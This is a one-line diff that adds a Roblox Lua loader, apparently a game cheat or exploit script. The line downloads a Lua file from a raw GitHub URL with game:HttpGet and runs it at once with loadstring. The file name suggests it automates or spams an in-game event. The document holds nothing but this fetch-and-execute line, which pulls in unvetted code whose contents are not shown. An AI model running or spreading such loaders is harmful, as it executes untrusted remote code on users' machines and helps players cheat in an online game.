@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/event-solve-the-cube-spam6-ix5xhu3il6tw8m.lua"))()
